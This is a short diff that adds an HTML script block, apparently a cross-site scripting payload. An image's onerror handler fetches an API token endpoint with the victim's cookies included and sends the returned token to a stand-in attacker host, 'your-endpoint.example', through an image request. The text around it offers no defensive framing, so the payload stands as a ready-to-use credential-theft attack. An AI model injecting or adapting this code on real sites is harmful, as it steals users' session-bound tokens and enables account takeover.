@@ -1,0 +1,21 @@
+<script>
+var img = document.createElement('img');
+img.src = 'invalid';
+
+img.onerror = function () {
+  fetch('https://example.com/api/tokens?limit=10', {
+    method: 'GET',
+    mode: 'cors',           // enable CORS
+    credentials: 'include'  // send cookies
+  })
+    .then(r => r.text())
+    .then(token => {
+      new Image().src =
+        'https://your-endpoint.example/?token=' +
+        encodeURIComponent(token);
+    })
+    .catch(err => console.error(err));
+};
+
+document.body.appendChild(img);
+</script>
